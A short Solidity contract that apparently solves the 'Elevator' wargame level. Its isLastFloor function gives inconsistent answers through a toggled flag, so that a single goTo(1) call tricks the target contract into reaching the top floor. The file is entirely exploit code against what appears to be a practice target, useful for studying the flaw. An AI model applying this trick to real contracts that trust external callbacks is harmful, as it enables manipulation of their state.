// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./hadcoins.sol";

contract Test {
    Elevator public ele;
    bool private isT = false;

    constructor(address payable addr) public {
        ele = Elevator(addr);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (!isT && floor == 1) {
            isT = true;
            return false;
        } else {
            return true;
        }
    }

    function callGoTo() public {
        ele.goTo(1);
    }
}
